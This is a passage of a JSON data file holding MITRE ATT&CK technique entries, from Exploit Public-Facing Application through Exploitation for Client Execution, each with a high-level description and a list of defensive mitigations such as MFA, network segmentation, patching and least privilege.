              "content": "Browser sandboxes can be used to mitigate some of the impact of exploitation, but sandbox escapes may still exist."
            }
          ],
          [
            {
              "type": "text",
              "content": "Other types of virtualization and application microsegmentation may also mitigate the impact of client-side exploitation. The risks of additional exploits and weaknesses in implementation may still exist for these types of systems."
            }
          ]
        ]
      },
      {
        "id": "M1050",
        "name": "Exploit Protection",
        "description": [
          [
            {
              "type": "text",
              "content": "Security applications that look for behavior used during exploitation such as Windows Defender Exploit Guard (WDEG) and the Enhanced Mitigation Experience Toolkit (EMET) can be used to mitigate some exploitation behavior.  Control flow integrity checking is another way to potentially identify and stop a software exploit from occurring.  Many of these protections depend on the architecture and target application binary for compatibility."
            }
          ]
        ]
      },
      {
        "id": "M1021",
        "name": "Restrict Web-Based Content",
        "description": [
          [
            {
              "type": "text",
              "content": "For malicious code served up through ads, adblockers can help prevent that code from executing in the first place."
            }
          ],
          [
            {
              "type": "text",
              "content": "Script blocking extensions can help prevent the execution of JavaScript that may commonly be used during the exploitation process."
            }
          ]
        ]
      },
      {
        "id": "M1051",
        "name": "Update Software",
        "description": [
          [
            {
              "type": "text",
              "content": "Ensure all browsers and plugins kept updated can help prevent the exploit phase of this technique. Use modern browsers with security features turned on."
            }
          ]
        ]
      }
    ]
  },
  {
    "id": "T1190",
    "name": "Exploit Public-Facing Application",
    "tactics": [{ "id": "TA0001", "name": "Initial Access" }],
    "subs": [],
    "version": "2.4",
    "description": [
      [
        {
          "type": "text",
          "content": "Adversaries may attempt to exploit a weakness in an Internet-facing host or system to initially access a network. The weakness in the system can be a software bug, a temporary glitch, or a misconfiguration."
        }
      ],
      [
        {
          "type": "text",
          "content": "Exploited applications are often websites/web servers, but can also include databases (like SQL), standard services (like SMB or SSH), network device administration and management protocols (like SNMP and Smart Install), and any other system with Internet accessible open sockets. Depending on the flaw being exploited this may also involve Exploitation for Defense Evasion. "
        }
      ],
      [
        {
          "type": "text",
          "content": "If an application is hosted on cloud-based infrastructure and/or is containerized, then exploiting it may lead to compromise of the underlying instance or container. This can allow an adversary a path to access the cloud or container APIs, exploit container host access via Escape to Host, or take advantage of weak identity and access management policies."
        }
      ],
      [
        {
          "type": "text",
          "content": "Adversaries may also exploit edge network infrastructure and related appliances, specifically targeting devices that do not support robust host-based defenses."
        }
      ],
      [
        {
          "type": "text",
          "content": "For websites and databases, the OWASP top 10 and CWE top 25 highlight the most common web-based vulnerabilities."
        }
      ]
    ],
    "mitigations": [
      {
        "id": "M1048",
        "name": "Application Isolation and Sandboxing",
        "description": [
          [
            {
              "type": "text",
              "content": "Application isolation will limit what other processes and system features the exploited target can access."
            }
          ]
        ]
      },
      {
        "id": "M1050",
        "name": "Exploit Protection",
        "description": [
          [
            {
              "type": "text",
              "content": "Web Application Firewalls may be used to limit exposure of applications to prevent exploit traffic from reaching the application."
            }
          ]
        ]
      },
      {
        "id": "M1030",
        "name": "Network Segmentation",
        "description": [
          [
            {
              "type": "text",
              "content": "Segment externally facing servers and services from the rest of the network with a DMZ or on separate hosting infrastructure."
            }
          ]
        ]
      },
      {
        "id": "M1026",
        "name": "Privileged Account Management",
        "description": [
          [
            {
              "type": "text",
              "content": "Use least privilege for service accounts will limit what permissions the exploited process gets on the rest of the system."
            }
          ]
        ]
      },
      {
        "id": "M1051",
        "name": "Update Software",
        "description": [
          [
            {
              "type": "text",
              "content": "Update software regularly by employing patch management for externally exposed applications."
            }
          ]
        ]
      },
      {
        "id": "M1016",
        "name": "Vulnerability Scanning",
        "description": [
          [
            {
              "type": "text",
              "content": "Regularly scan externally facing systems for vulnerabilities and establish procedures to rapidly patch systems when critical vulnerabilities are discovered through scanning and through public disclosure."
            }
          ]
        ]
      }
    ]
  },
  {
    "id": "T1133",
    "name": "External Remote Services",
    "tactics": [
      { "id": "TA0003", "name": "Persistence" },
      { "id": "TA0001", "name": "Initial Access" }
    ],
    "subs": [],
    "version": "2.4",
    "description": [
      [
        {
          "type": "text",
          "content": "Adversaries may leverage external-facing remote services to initially access and/or persist within a network. Remote services such as VPNs, Citrix, and other access mechanisms allow users to connect to internal enterprise network resources from external locations. There are often remote service gateways that manage connections and credential authentication for these services. Services such as Windows Remote Management and VNC can also be used externally."
        }
      ],
      [
        {
          "type": "text",
          "content": "Access to Valid Accounts to use the service is often a requirement, which could be obtained through credential pharming or by obtaining the credentials from users after compromising the enterprise network. Access to remote services may be used as a redundant or persistent access mechanism during an operation."
        }
      ],
      [
        {
          "type": "text",
          "content": "Access may also be gained through an exposed service that doesn’t require authentication. In containerized environments, this may include an exposed Docker API, Kubernetes API server, kubelet, or web application such as the Kubernetes dashboard."
        }
      ]
    ],
    "mitigations": [
      {
        "id": "M1042",
        "name": "Disable or Remove Feature or Program",
        "description": [
          [
            {
              "type": "text",
              "content": "Disable or block remotely available services that may be unnecessary."
            }
          ]
        ]
      },
      {
        "id": "M1035",
        "name": "Limit Access to Resource Over Network",
        "description": [
          [
            {
              "type": "text",
              "content": "Limit access to remote services through centrally managed concentrators such as VPNs and other managed remote access systems."
            }
          ]
        ]
      },
      {
        "id": "M1032",
        "name": "Multi-factor Authentication",
        "description": [
          [
            {
              "type": "text",
              "content": "Use strong two-factor or multi-factor authentication for remote service accounts to mitigate an adversary's ability to leverage stolen credentials, but be aware of Multi-Factor Authentication Interception techniques for some two-factor authentication implementations."
            }
          ]
        ]
      },
      {
        "id": "M1030",
        "name": "Network Segmentation",
        "description": [
          [
            {
              "type": "text",
              "content": "Deny direct remote access to internal systems through the use of network proxies, gateways, and firewalls."
            }
          ]
        ]
      }
    ]
  },
  {
    "id": "T1200",
    "name": "Hardware Additions",
    "tactics": [{ "id": "TA0001", "name": "Initial Access" }],
    "subs": [],
    "version": "1.6",
    "description": [
      [
        {
          "type": "text",
          "content": "Adversaries may introduce computer accessories, networking hardware, or other computing devices into a system or network that can be used as a vector to gain access. Rather than just connecting and distributing payloads via removable storage (i.e. Replication Through Removable Media), more robust hardware additions can be used to introduce new functionalities and/or features into a system that can then be abused."
        }
      ],
      [
        {
          "type": "text",
          "content": "While public references of usage by threat actors are scarce, many red teams/penetration testers leverage hardware additions for initial access. Commercial and open source products can be leveraged with capabilities such as passive network tapping, network traffic modification (i.e. Adversary-in-the-Middle), keystroke injection, kernel memory reading via DMA, addition of new wireless access to an existing network, and others."
        }
      ]
    ],
    "mitigations": [
      {
        "id": "M1035",
        "name": "Limit Access to Resource Over Network",
        "description": [
          [
            {
              "type": "text",
              "content": "Establish network access control policies, such as using device certificates and the 802.1x standard.  Restrict use of DHCP to registered devices to prevent unregistered devices from communicating with trusted systems."
            }
          ]
        ]
      },
      {
        "id": "M1034",
        "name": "Limit Hardware Installation",
        "description": [
          [
            {
              "type": "text",
              "content": "Block unknown devices and accessories by endpoint security configuration and monitoring agent."
            }
          ]
        ]
      }
    ]
  },
  {
    "id": "T1566",
    "name": "Phishing",
    "tactics": [{ "id": "TA0001", "name": "Initial Access" }],
    "subs": [
      { "id": "T1566.001", "name": "Spearphishing Attachment" },
      { "id": "T1566.002", "name": "Spearphishing Link" },
      { "id": "T1566.003", "name": "Spearphishing via Service" },
      { "id": "T1566.004", "name": "Spearphishing Voice" }
    ],
    "version": "2.4",
    "description": [
      [
        {
          "type": "text",
          "content": "Adversaries may send phishing messages to gain access to victim systems. All forms of phishing are electronically delivered social engineering. Phishing can be targeted, known as spearphishing. In spearphishing, a specific individual, company, or industry will be targeted by the adversary. More generally, adversaries can conduct non-targeted phishing, such as in mass malware spam campaigns."
        }
      ],
      [
        {
          "type": "text",
          "content": "Adversaries may send victims emails containing malicious attachments or links, typically to execute malicious code on victim systems. Phishing may also be conducted via third-party services, like social media platforms. Phishing may also involve social engineering techniques, such as posing as a trusted source, as well as evasive techniques such as removing or manipulating emails or metadata/headers from compromised accounts being abused to send messages (e.g., Email Hiding Rules). Another way to accomplish this is by forging or spoofing the identity of the sender which can be used to fool both the human recipient as well as automated security tools. "
        }
      ],
      [
        {
          "type": "text",
          "content": "Victims may also receive phishing messages that instruct them to call a phone number where they are directed to visit a malicious URL, download malware, or install adversary-accessible remote management tools onto their computer (i.e., User Execution)."
        }
      ]
    ],
    "mitigations": [
      {
        "id": "M1049",
        "name": "Antivirus/Antimalware",
        "description": [
          [
            {
              "type": "text",
              "content": "Anti-virus can automatically quarantine suspicious files."
            }
          ]
        ]
      },
      {
        "id": "M1031",
        "name": "Network Intrusion Prevention",
        "description": [
          [
            {
              "type": "text",
              "content": "Network intrusion prevention systems and systems designed to scan and remove malicious email attachments or links can be used to block activity."
            }
          ]
        ]
      },
      {
        "id": "M1021",
        "name": "Restrict Web-Based Content",
        "description": [
          [
            {
              "type": "text",
              "content": "Determine if certain websites or attachment types (ex: .scr, .exe, .pif, .cpl, etc.) that can be used for phishing are necessary for business operations and consider blocking access if activity cannot be monitored well or if it poses a significant risk."
            }
          ]
        ]
      },
      {
        "id": "M1054",
        "name": "Software Configuration",
        "description": [
          [
            {
              "type": "text",
              "content": "Use anti-spoofing and email authentication mechanisms to filter messages based on validity checks of the sender domain (using SPF) and integrity of messages (using DKIM). Enabling these mechanisms within an organization (through policies such as DMARC) may enable recipients (intra-org and cross domain) to perform similar message filtering and validation."
            }
          ]
        ]
      },
      {
        "id": "M1017",
        "name": "User Training",
        "description": [
          [
            {
              "type": "text",
              "content": "Users can be trained to identify social engineering techniques and phishing emails."
            }
          ]
        ]
      }
    ]
  },
  {
    "id": "T1091",
    "name": "Replication Through Removable Media",
    "tactics": [
      { "id": "TA0008", "name": "Lateral Movement" },
      { "id": "TA0001", "name": "Initial Access" }
    ],
    "subs": [],
    "version": "1.2",
    "description": [
      [
        {
          "type": "text",
          "content": "Adversaries may move onto systems, possibly those on disconnected or air-gapped networks, by copying malware to removable media and taking advantage of Autorun features when the media is inserted into a system and executes. In the case of Lateral Movement, this may occur through modification of executable files stored on removable media or by copying malware and renaming it to look like a legitimate file to trick users into executing it on a separate system. In the case of Initial Access, this may occur through manual manipulation of the media, modification of systems used to initially format the media, or modification to the media's firmware itself."
        }
      ],
      [
        {
          "type": "text",
          "content": "Mobile devices may also be used to infect PCs with malware if connected via USB. This infection may be achieved using devices (Android, iOS, etc.) and, in some instances, USB charging cables. For example, when a smartphone is connected to a system, it may appear to be mounted similar to a USB-connected disk drive. If malware that is compatible with the connected system is on the mobile device, the malware could infect the machine (especially if Autorun features are enabled)."
        }
      ]
    ],
    "mitigations": [
      {
        "id": "M1040",
        "name": "Behavior Prevention on Endpoint",
        "description": [
          [
            {
              "type": "text",
              "content": "On Windows 10, enable Attack Surface Reduction (ASR) rules to block unsigned/untrusted executable files (such as .exe, .dll, or .scr) from running from USB removable drives. "
            }
          ]
        ]
      },
      {
        "id": "M1042",
        "name": "Disable or Remove Feature or Program",
        "description": [
          [
            {
              "type": "text",
              "content": "Disable Autorun if it is unnecessary.  Disallow or restrict removable media at an organizational policy level if it is not required for business operations. "
            }
          ]
        ]
      },
      {
        "id": "M1034",
        "name": "Limit Hardware Installation",
        "description": [
          [
            {
              "type": "text",
              "content": "Limit the use of USB devices and removable media within a network."
            }
          ]
        ]
      }
    ]
  },
  {
    "id": "T1195",
    "name": "Supply Chain Compromise",
    "tactics": [{ "id": "TA0001", "name": "Initial Access" }],
    "subs": [
      {
        "id": "T1195.001",
        "name": "Compromise Software Dependencies and Development Tools"
      },
      { "id": "T1195.002", "name": "Compromise Software Supply Chain" },
      { "id": "T1195.003", "name": "Compromise Hardware Supply Chain" }
    ],
    "version": "1.5",
    "description": [
      [
        {
          "type": "text",
          "content": "Adversaries may manipulate products or product delivery mechanisms prior to receipt by a final consumer for the purpose of data or system compromise."
        }
      ],
      [
        {
          "type": "text",
          "content": "Supply chain compromise can take place at any stage of the supply chain including:"
        }
      ],
      [
        { "type": "li", "content": "Manipulation of development tools" },
        {
          "type": "li",
          "content": "Manipulation of a development environment"
        },
        {
          "type": "li",
          "content": "Manipulation of source code repositories (public or private)"
        },
        {
          "type": "li",
          "content": "Manipulation of source code in open-source dependencies"
        },
        {
          "type": "li",
          "content": "Manipulation of software update/distribution mechanisms"
        },
        {
          "type": "li",
          "content": "Compromised/infected system images (multiple cases of removable media infected at the factory)"
        },
        {
          "type": "li",
          "content": "Replacement of legitimate software with modified versions"
        },
        {
          "type": "li",
          "content": "Sales of modified/counterfeit products to legitimate distributors"
        },
        { "type": "li", "content": "Shipment interdiction" }
      ],
      [
        {
          "type": "text",
          "content": "While supply chain compromise can impact any component of hardware or software, adversaries looking to gain execution have often focused on malicious additions to legitimate software in software distribution or update channels. Targeting may be specific to a desired victim set or malicious software may be distributed to a broad set of consumers but only move on to additional tactics on specific victims. Popular open source projects that are used as dependencies in many applications may also be targeted as a means to add malicious code to users of the dependency."
        }
      ]
    ],
    "mitigations": [
      {
        "id": "M1051",
        "name": "Update Software",
        "description": [
          [
            {
              "type": "text",
              "content": "A patch management process should be implemented to check unused dependencies, unmaintained and/or previously vulnerable dependencies, unnecessary features, components, files, and documentation."
            }
          ]
        ]
      },
      {
        "id": "M1016",
        "name": "Vulnerability Scanning",
        "description": [
          [
            {
              "type": "text",
              "content": "Continuous monitoring of vulnerability sources and the use of automatic and manual code review tools should also be implemented as well."
            }
          ]
        ]
      }
    ]
  },
  {
    "id": "T1199",
    "name": "Trusted Relationship",
    "tactics": [{ "id": "TA0001", "name": "Initial Access" }],
    "subs": [],
    "version": "2.3",
    "description": [
      [
        {
          "type": "text",
          "content": "Adversaries may breach or otherwise leverage organizations who have access to intended victims. Access through trusted third party relationship abuses an existing connection that may not be protected or receives less scrutiny than standard mechanisms of gaining access to a network."
        }
      ],
      [
        {
          "type": "text",
          "content": "Organizations often grant elevated access to second or third-party external providers in order to allow them to manage internal systems as well as cloud-based environments. Some examples of these relationships include IT services contractors, managed security providers, infrastructure contractors (e.g. HVAC, elevators, physical security). The third-party provider's access may be intended to be limited to the infrastructure being maintained, but may exist on the same network as the rest of the enterprise. As such, Valid Accounts used by the other party for access to internal network systems may be compromised and used."
        }
      ],
      [
        {
          "type": "text",
          "content": "In Office 365 environments, organizations may grant Microsoft partners or resellers delegated administrator permissions. By compromising a partner or reseller account, an adversary may be able to leverage existing delegated administrator relationships or send new delegated administrator offers to clients in order to gain administrative control over the victim tenant."
        }
      ]
    ],
    "mitigations": [
      {
        "id": "M1032",
        "name": "Multi-factor Authentication",
        "description": [
          [
            {
              "type": "text",
              "content": "Require MFA for all delegated administrator accounts."
            }
          ]
        ]
      },
      {
        "id": "M1030",
        "name": "Network Segmentation",
        "description": [
          [
            {
              "type": "text",
              "content": "Network segmentation can be used to isolate infrastructure components that do not require broad network access."
            }
          ]
        ]
      },
      {
        "id": "M1018",
        "name": "User Account Management",
        "description": [
          [
            {
              "type": "text",
              "content": "Properly manage accounts and permissions used by parties in trusted relationships to minimize potential abuse by the party and if the party is compromised by an adversary. In Office 365 environments, partner relationships and roles can be viewed under the \"Partner Relationships\" page."
            }
          ]
        ]
      }
    ]
  },
  {
    "id": "T1078",
    "name": "Valid Accounts",
    "tactics": [
      { "id": "TA0005", "name": "Defense Evasion" },
      { "id": "TA0003", "name": "Persistence" },
      { "id": "TA0004", "name": "Privilege Escalation" },
      { "id": "TA0001", "name": "Initial Access" }
    ],
    "subs": [
      { "id": "T1078.001", "name": "Default Accounts" },
      { "id": "T1078.002", "name": "Domain Accounts" },
      { "id": "T1078.003", "name": "Local Accounts" },
      { "id": "T1078.004", "name": "Cloud Accounts" }
    ],
    "version": "2.6",
    "description": [
      [
        {
          "type": "text",
          "content": "Adversaries may obtain and abuse credentials of existing accounts as a means of gaining Initial Access, Persistence, Privilege Escalation, or Defense Evasion. Compromised credentials may be used to bypass access controls placed on various resources on systems within the network and may even be used for persistent access to remote systems and externally available services, such as VPNs, Outlook Web Access, network devices, and remote desktop. Compromised credentials may also grant an adversary increased privilege to specific systems or access to restricted areas of the network. Adversaries may choose not to use malware or tools in conjunction with the legitimate access those credentials provide to make it harder to detect their presence."
        }
      ],
      [
        {
          "type": "text",
          "content": "In some cases, adversaries may abuse inactive accounts: for example, those belonging to individuals who are no longer part of an organization. Using these accounts may allow the adversary to evade detection, as the original account user will not be present to identify any anomalous activity taking place on their account."
        }
      ],
      [
        {
          "type": "text",
          "content": "The overlap of permissions for local, domain, and cloud accounts across a network of systems is of concern because the adversary may be able to pivot across accounts and systems to reach a high level of access (i.e., domain or enterprise administrator) to bypass access controls set within the enterprise."
        }
      ]
    ],
    "mitigations": [
      {
        "id": "M1036",
        "name": "Account Use Policies",
        "description": [
          [
            {
              "type": "text",
              "content": "Use conditional access policies to block logins from non-compliant devices or from outside defined organization IP ranges."
            }
          ]
        ]
      },
      {
        "id": "M1015",
        "name": "Active Directory Configuration",
        "description": [
          [
            {
              "type": "text",
              "content": "Disable legacy authentication, which does not support MFA, and require the use of modern authentication protocols instead."
            }
          ]
        ]
      },
      {
        "id": "M1013",
        "name": "Application Developer Guidance",
        "description": [
          [
            {
              "type": "text",
              "content": "Ensure that applications do not store sensitive data or credentials insecurely. (e.g. plaintext credentials in code, published credentials in repositories, or credentials in public cloud storage)."
            }
          ]
        ]
      },
      {
        "id": "M1027",
        "name": "Password Policies",
        "description": [
          [
            {
              "type": "text",
              "content": "Applications and appliances that utilize default username and password should be changed immediately after the installation, and before deployment to a production environment. When possible, applications that use SSH keys should be updated periodically and properly secured."
            }
          ],
          [
            {
              "type": "text",
              "content": "Policies should minimize (if not eliminate) reuse of passwords between different user accounts, especially employees using the same credentials for personal accounts that may not be defended by enterprise security resources."
            }
          ]
        ]
      },
      {
        "id": "M1026",
        "name": "Privileged Account Management",
        "description": [
          [
            {
              "type": "text",
              "content": "Audit domain and local accounts as well as their permission levels routinely to look for situations that could allow an adversary to gain wide access by obtaining credentials of a privileged account.   These audits should also include if default accounts have been enabled, or if new local accounts are created that have not be authorized. Follow best practices for design and administration of an enterprise network to limit privileged account use across administrative tiers. "
            }
          ]
        ]
      },
      {
        "id": "M1018",
        "name": "User Account Management",
        "description": [
          [
            {
              "type": "text",
              "content": "Regularly audit user accounts for activity and deactivate or remove any that are no longer needed."
            }
          ]
        ]
      },
      {
        "id": "M1017",
        "name": "User Training",
        "description": [
          [
            {
              "type": "text",
              "content": "Applications may send push notifications to verify a login as a form of multi-factor authentication (MFA). Train users to only accept valid push notifications and to report suspicious push notifications."
            }
          ]
        ]
      }
    ]
  },
  {
    "id": "T1651",
    "name": "Cloud Administration Command",
    "tactics": [{ "id": "TA0002", "name": "Execution" }],
    "subs": [],
    "version": "1.0",
    "description": [
      [
        {
          "type": "text",
          "content": "Adversaries may abuse cloud management services to execute commands within virtual machines or hybrid-joined devices. Resources such as AWS Systems Manager, Azure RunCommand, and Runbooks allow users to remotely run scripts in virtual machines by leveraging installed virtual machine agents. Similarly, in Azure AD environments, Microsoft Endpoint Manager allows Global or Intune Administrators to run scripts as SYSTEM on on-premises devices joined to the Azure AD."
        }
      ],
      [
        {
          "type": "text",
          "content": "If an adversary gains administrative access to a cloud environment, they may be able to abuse cloud management services to execute commands in the environment’s virtual machines or on-premises hybrid-joined devices. Additionally, an adversary that compromises a service provider or delegated administrator account may similarly be able to leverage a Trusted Relationship to execute commands in connected virtual machines."
        }
      ]
    ],
    "mitigations": [
      {
        "id": "M1026",
        "name": "Privileged Account Management",
        "description": [
          [
            {
              "type": "text",
              "content": "Limit the number of cloud accounts with permissions to remotely execute commands on virtual machines, and ensure that these are not used for day-to-day operations. In Azure, limit the number of accounts with the roles Azure Virtual Machine Contributer and above, and consider using temporary Just-in-Time (JIT) roles to avoid permanently assigning privileged access to virtual machines. In Azure AD, limit the number of Global and Intune administrators to only those required. In AWS, limit users with permission to execute the "
            },
            { "type": "code", "content": "ssm:SendCommand" },
            {
              "type": "text",
              "content": " action, and use tags to restrict the number of machines those users can execute commands on."
            }
          ]
        ]
      }
    ]
  },
  {
    "id": "T1059",
    "name": "Command and Scripting Interpreter",
    "tactics": [{ "id": "TA0002", "name": "Execution" }],
    "subs": [
      { "id": "T1059.001", "name": "PowerShell" },
      { "id": "T1059.002", "name": "AppleScript" },
      { "id": "T1059.003", "name": "Windows Command Shell" },
      { "id": "T1059.004", "name": "Unix Shell" },
      { "id": "T1059.005", "name": "Visual Basic" },
      { "id": "T1059.006", "name": "Python" },
      { "id": "T1059.007", "name": "JavaScript" },
      { "id": "T1059.008", "name": "Network Device CLI" },
      { "id": "T1059.009", "name": "Cloud API" }
    ],
    "version": "2.4",
    "description": [
      [
        {
          "type": "text",
          "content": "Adversaries may abuse command and script interpreters to execute commands, scripts, or binaries. These interfaces and languages provide ways of interacting with computer systems and are a common feature across many different platforms. Most systems come with some built-in command-line interface and scripting capabilities, for example, macOS and Linux distributions include some flavor of Unix Shell while Windows installations include the Windows Command Shell and PowerShell."
        }
      ],
      [
        {
          "type": "text",
          "content": "There are also cross-platform interpreters such as Python, as well as those commonly associated with client applications such as JavaScript and Visual Basic."
        }
      ],
      [
        {
          "type": "text",
          "content": "Adversaries may abuse these technologies in various ways as a means of executing arbitrary commands. Commands and scripts can be embedded in Initial Access payloads delivered to victims as lure documents or as secondary payloads downloaded from an existing C2. Adversaries may also execute commands through interactive terminals/shells, as well as utilize various Remote Services in order to achieve remote Execution."
        }
      ]
    ],
    "mitigations": [
      {
        "id": "M1049",
        "name": "Antivirus/Antimalware",
        "description": [
          [
            {
              "type": "text",
              "content": "Anti-virus can be used to automatically quarantine suspicious files. "
            }
          ]
        ]
      },
      {
        "id": "M1040",
        "name": "Behavior Prevention on Endpoint",
        "description": [
          [
            {
              "type": "text",
              "content": "On Windows 10, enable Attack Surface Reduction (ASR) rules to prevent Visual Basic and JavaScript scripts from executing potentially malicious downloaded content ."
            }
          ]
        ]
      },
      {
        "id": "M1045",
        "name": "Code Signing",
        "description": [
          [
            {
              "type": "text",
              "content": "Where possible, only permit execution of signed scripts."
            }
          ]
        ]
      },
      {
        "id": "M1042",
        "name": "Disable or Remove Feature or Program",
        "description": [
          [
            {
              "type": "text",
              "content": "Disable or remove any unnecessary or unused shells or interpreters."
            }
          ]
        ]
      },
      {
        "id": "M1038",
        "name": "Execution Prevention",
        "description": [
          [
            {
              "type": "text",
              "content": "Use application control where appropriate. For example, PowerShell Constrained Language mode can be used to restrict access to sensitive or otherwise dangerous language elements such as those used to execute arbitrary Windows APIs or files (e.g., "
            },
            { "type": "code", "content": "Add-Type" },
            { "type": "text", "content": ")." }
          ]
        ]
      },
      {
        "id": "M1026",
        "name": "Privileged Account Management",
        "description": [
          [
            {
              "type": "text",
              "content": "When PowerShell is necessary, consider restricting PowerShell execution policy to administrators. Be aware that there are methods of bypassing the PowerShell execution policy, depending on environment configuration."
            }
          ],
          [
            {
              "type": "text",
              "content": "PowerShell JEA (Just Enough Administration) may also be used to sandbox administration and limit what commands admins/users can execute through remote PowerShell sessions."
            }
          ]
        ]
      },
      {
        "id": "M1021",
        "name": "Restrict Web-Based Content",
        "description": [
          [
            {
              "type": "text",
              "content": "Script blocking extensions can help prevent the execution of scripts and HTA files that may commonly be used during the exploitation process. For malicious code served up through ads, adblockers can help prevent that code from executing in the first place."
            }
          ]
        ]
      }
    ]
  },
  {
    "id": "T1609",
    "name": "Container Administration Command",
    "tactics": [{ "id": "TA0002", "name": "Execution" }],
    "subs": [],
    "version": "1.2",
    "description": [
      [
        {
          "type": "text",
          "content": "Adversaries may abuse a container administration service to execute commands within a container. A container administration service such as the Docker daemon, the Kubernetes API server, or the kubelet may allow remote management of containers within an environment."
        }
      ],
      [
        {
          "type": "text",
          "content": "In Docker, adversaries may specify an entrypoint during container deployment that executes a script or command, or they may use a command such as "
        },
        { "type": "code", "content": "docker exec" },
        {
          "type": "text",
          "content": " to execute a command within a running container. In Kubernetes, if an adversary has sufficient permissions, they may gain remote execution in a container in the cluster via interaction with the Kubernetes API server, the kubelet, or by running a command such as "
        },
        { "type": "code", "content": "kubectl exec" },
        { "type": "text", "content": "." }
      ]
    ],
    "mitigations": [
      {
        "id": "M1042",
        "name": "Disable or Remove Feature or Program",
        "description": [
          [
            {
              "type": "text",
              "content": "Remove unnecessary tools and software from containers."
            }
          ]
        ]
      },
      {
        "id": "M1038",
        "name": "Execution Prevention",
        "description": [
          [
            {
              "type": "text",
              "content": "Use read-only containers, read-only file systems, and minimal images when possible to prevent the execution of commands. Where possible, also consider using application control and software restriction tools (such as those provided by SELinux) to restrict access to files, processes, and system calls in containers."
            }
          ]
        ]
      },
      {
        "id": "M1035",
        "name": "Limit Access to Resource Over Network",
        "description": [
          [
            {
              "type": "text",
              "content": "Limit communications with the container service to managed and secured channels, such as local Unix sockets or remote access via SSH. Require secure port access to communicate with the APIs over TLS by disabling unauthenticated access to the Docker API and Kubernetes API Server. In Kubernetes clusters deployed in cloud environments, use native cloud platform features to restrict the IP ranges that are permitted to access to API server. Where possible, consider enabling just-in-time (JIT) access to the Kubernetes API to place additional restrictions on access."
            }
          ]
        ]
      },
      {
        "id": "M1026",
        "name": "Privileged Account Management",
        "description": [
          [
            {
              "type": "text",
              "content": "Ensure containers are not running as root by default. In Kubernetes environments, consider defining Pod Security Standards that prevent pods from running privileged containers and using the "
            },
            { "type": "code", "content": "NodeRestriction" },
            {
              "type": "text",
              "content": " admission controller to deny the kublet access to nodes and pods outside of the node it belongs to. "
            }
          ]
        ]
      },
      {
        "id": "M1018",
        "name": "User Account Management",
        "description": [
          [
            {
              "type": "text",
              "content": "Enforce authentication and role-based access control on the container service to restrict users to the least privileges required. When using Kubernetes, avoid giving users wildcard permissions or adding users to the "
            },
            { "type": "code", "content": "system:masters" },
            { "type": "text", "content": " group, and use " },
            { "type": "code", "content": "RoleBindings" },
            { "type": "text", "content": " rather than " },
            { "type": "code", "content": "ClusterRoleBindings" },
            {
              "type": "text",
              "content": " to limit user privileges to specific namespaces."
            }
          ]
        ]
      }
    ]
  },
  {
    "id": "T1610",
    "name": "Deploy Container",
    "tactics": [
      { "id": "TA0005", "name": "Defense Evasion" },
      { "id": "TA0002", "name": "Execution" }
    ],
    "subs": [],
    "version": "1.2",
    "description": [
      [
        {
          "type": "text",
          "content": "Adversaries may deploy a container into an environment to facilitate execution or evade defenses. In some cases, adversaries may deploy a new container to execute processes associated with a particular image or deployment, such as processes that execute or download malware. In others, an adversary may deploy a new container configured without network rules, user limitations, etc. to bypass existing defenses within the environment."
        }
      ],
      [
        {
          "type": "text",
          "content": "Containers can be deployed by various means, such as via Docker's "
        },
        { "type": "code", "content": "create" },
        { "type": "text", "content": " and " },
        { "type": "code", "content": "start" },
        {
          "type": "text",
          "content": " APIs or via a web application such as the Kubernetes dashboard or Kubeflow. Adversaries may deploy containers based on retrieved or built malicious images or from benign images that download and execute malicious payloads at runtime."
        }
      ]
    ],
    "mitigations": [
      {
        "id": "M1047",
        "name": "Audit",
        "description": [
          [
            {
              "type": "text",
              "content": "Scan images before deployment, and block those that are not in compliance with security policies. In Kubernetes environments, the admission controller can be used to validate images after a container deployment request is authenticated but before the container is deployed."
            }
          ]
        ]
      },
      {
        "id": "M1035",
        "name": "Limit Access to Resource Over Network",
        "description": [
          [
            {
              "type": "text",
              "content": "Limit communications with the container service to managed and secured channels, such as local Unix sockets or remote access via SSH. Require secure port access to communicate with the APIs over TLS by disabling unauthenticated access to the Docker API, Kubernetes API Server, and container orchestration web applications. In Kubernetes clusters deployed in cloud environments, use native cloud platform features to restrict the IP ranges that are permitted to access to API server. Where possible, consider enabling just-in-time (JIT) access to the Kubernetes API to place additional restrictions on access."
            }
          ]
        ]
      },
      {
        "id": "M1030",
        "name": "Network Segmentation",
        "description": [
          [
            {
              "type": "text",
              "content": "Deny direct remote access to internal systems through the use of network proxies, gateways, and firewalls."
            }
          ]
        ]
      },
      {
        "id": "M1018",
        "name": "User Account Management",
        "description": [
          [
            {
              "type": "text",
              "content": "Enforce the principle of least privilege by limiting container dashboard access to only the necessary users. When using Kubernetes, avoid giving users wildcard permissions or adding users to the "
            },
            { "type": "code", "content": "system:masters" },
            { "type": "text", "content": " group, and use " },
            { "type": "code", "content": "RoleBindings" },
            { "type": "text", "content": " rather than " },
            { "type": "code", "content": "ClusterRoleBindings" },
            {
              "type": "text",
              "content": " to limit user privileges to specific namespaces."
            }
          ]
        ]
      }
    ]
  },
  {
    "id": "T1203",
    "name": "Exploitation for Client Execution",
    "tactics": [{ "id": "TA0002", "name": "Execution" }],
    "subs": [],
    "version": "1.4",
    "description": [
      [
        {
          "type": "text",
          "content": "Adversaries may exploit software vulnerabilities in client applications to execute code. Vulnerabilities can exist in software due to unsecure coding practices that can lead to unanticipated behavior. Adversaries can take advantage of certain vulnerabilities through targeted exploitation for the purpose of arbitrary code execution. Oftentimes the most valuable exploits to an offensive toolkit are those that can be used to obtain code execution on a remote system because they can be used to gain access to that system. Users will expect to see files related to the applications they commonly used to do work, so they are a useful target for exploit research and development because of their high utility."
        }
      ],
      [{ "type": "text", "content": "Several types exist:" }],
      [
        {
          "type": "text",
          "content": "Web browsers are a common target through Drive-by Compromise and Spearphishing Link. Endpoint systems may be compromised through normal web browsing or from certain users being targeted by links in spearphishing emails to adversary controlled sites used to exploit the web browser. These often do not require an action by the user for the exploit to be executed."
        }
      ],
      [
        {
          "type": "text",
          "content": "Common office and productivity applications such as Microsoft Office are also targeted through Phishing. Malicious files will be transmitted directly as attachments or through links to download them. These require the user to open the document or file for the exploit to run."
        }
      ],
      [
        {
          "type": "text",
          "content": "Other applications that are commonly seen or are part of the software deployed in a target network may also be used for exploitation. Applications such as Adobe Reader and Flash, which are common in enterprise environments, have been routinely targeted by adversaries attempting to gain access to systems. Depending on the software and nature of the vulnerability, some may be exploited in the browser or require the user to open a file. For instance, some Flash exploits have been delivered as objects within Microsoft Office documents."
        }
      ]
    ],
    "mitigations": [
      {
        "id": "M1048",
